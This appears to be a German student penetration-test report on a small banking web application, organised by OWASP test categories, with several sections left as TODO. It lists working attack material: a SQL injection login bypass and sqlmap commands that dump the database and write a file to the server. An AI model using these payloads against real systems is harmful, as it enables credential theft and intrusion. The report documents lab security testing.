# Pentest WebApplication

## Beschreibung IDE und Tools:
Betriebssystem: Windows 10 Version 1803 (Build 17134.407)  
IDE: IntelliJ IDEA 2018.2.6 (Ultimate Edition) Build #IU-182.5107.16  
Java 9  
![Firefox Add-on Cookie Manager v1.5](https://addons.mozilla.org/de/firefox/addon/a-cookie-manager/)

![Google Chrome Erweiterung v1.4.9](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=de)

Kali Linux  2018.4-vbox-amd64  
OWASP ZAP 2.7.0 

Die zu testende Anwendung:  
https://github.com/TimSro/BiBiFi

## Information Gathering
Durchlauf mit ZAP um Übergabeparameter zu sehen:

![alt text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/info_gathering/ZAP_Scan.png)
      
## Configuration and deployment management testing
# TODO

## Identity Managment Testing
# TODO
Registrierung und Password-Policy vorhanden.  
Account raten ist schwierig, da theoretisch jede eMail zur Anmeldung in Frage kommen kann.   

## Authentication Testing
Username und Passwort werden in der URL und im Request mitgesendet und sind damit anfällig ausgelesen zu werden.  
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/auth/ZAP_Auth_Test.png)

Zudem, kann die Anzeige der Anwendung durch Manipulation der URL beeinflusst werden
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/auth/URL_manipulation.png)

Durch kopieren der SessionID kann sich ein unangemeldeter Nutzer in das System schleichen.  
![alt text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/session/sessionGcCookieTool.png)
![alt text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/session/sessionSuccessfulHijack.png)

## Authorization Testing
Es gibt keine Möglichkeit über das Einloggen als normaler Benutzer auf Funktionen des Admins zuzugreifen.  
Wenn man ausgeloggt ist, bleibt man ausgeloggt.

## Testing for Session Fixation
# TODO

## Input Validation Testing
Durch einfügen eines Slashes "/" kann ein Fehlercode 500 erzeugt werden.
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/input_validation/url_manipulation.png)

### SQL Injection
Es ist möglich sich mit folgenden Daten anzumelden:  
Kontonummer: 1 OR Passwort = "Pa55w0rt"  
Passwort = Pa55w0rt  
Dabei kann jedes beliebiges Passwort, welches irgendein Benutzer hat, genutzt werden. (Bspw. durch das Raten von Passwörtern ist ein gültige Passwort auffindbar)  
Anschließend kann man für den ersten Account in der Datenbank mit dem geratenem Passwort den Kontostand sehen.  
Jedoch ist es nicht möglich weitere Aktionen auf dem Account auszuführen.  

Allerding kann man damit eine Blind SQL Injection durchführen.  
Bspw. mit dem Tool sqlmap und dem Kommando:  
sqlmap -u http://[IP-Adresse auf dem der Tomcat läuft]:8080/Servlet --data="uname=1 OR Passwort = \"Pa55w0rt\"&pasw=Pa55w0rt&bank=banka&loginOB="  

Dadruch kann bespielsweise eine Datei im DBMS abgelegt werden:  
sqlmap -u http://[IP-Adresse auf dem der Tomcat läuft]:8080/Servlet --data="uname=1 OR Passwort = \"Pa55w0rt\"&pasw=Pa55w0rt&bank=banka&loginOB=" --file-write"/tmp/datei" --file-dest="C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/datei"  

Oder es kann der gesamte Datenbankinhalt ausgegeben werden:  
sqlmap -u http://[IP-Adresse auf dem der Tomcat läuft]:8080/Servlet --data="uname=1 OR Passwort = \"Pa55w0rt\"&pasw=Pa55w0rt&bank=banka&loginOB=" --dump  
![alt text](https://github.com/RocketJulia/Pentest/blob/master/Screenshots/SQL_Injection.png) 

### XSS
Durch XSS kann ein Fehlercode 400 erzeugt werden.
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/input_validation/xss_400.png)

Die folgenden Eingaben wurden ebenfalls getestet, führten jedoch zu keinem Ergebnis.
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/input_validation/xss_noResult_01.png)
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/input_validation/xss_noResult_02.png)
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/input_validation/xss_noResult_03.png)
![alt_text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/input_validation/xss_noResult_04.png)

## Testing for Error Handling
Wie schon oben aufgeführt, lassen sich ein paar Fehler erzeugen, jedoch keinerlei Stacktraces oder ähnliches auslesen.

## Testing for weak Cryptography
# TODO
Es findet keine verschlüsselte Übertragung von Daten statt, sodass man den Datenfluss abfangen und lesen kann. 
Beispielsweise Passwörter etc.  

Auch die Passwörter in der Datenbank sind nicht verschlüsselt.  
Mit einem Datenbankzugriff via Blind SQL Injection kann man somit alle Anemldedaten im Klartext erhalten. 
Siehe Punkt "SQL Incjection".

## Business Logic Testing
Keine Vorhanden

## Client Side Testing
Die Seite ist gegen Clickjacking geschützt.  
Das haben wir [hiermit](https://github.com/RocketJulia/Pentest/tree/master/Dateien/Clickjacking.html) getestet.  
![alt text](https://github.com/Vituratic/ATMWebApplication/blob/master/screenshots/client_side/Clickjacking.png)
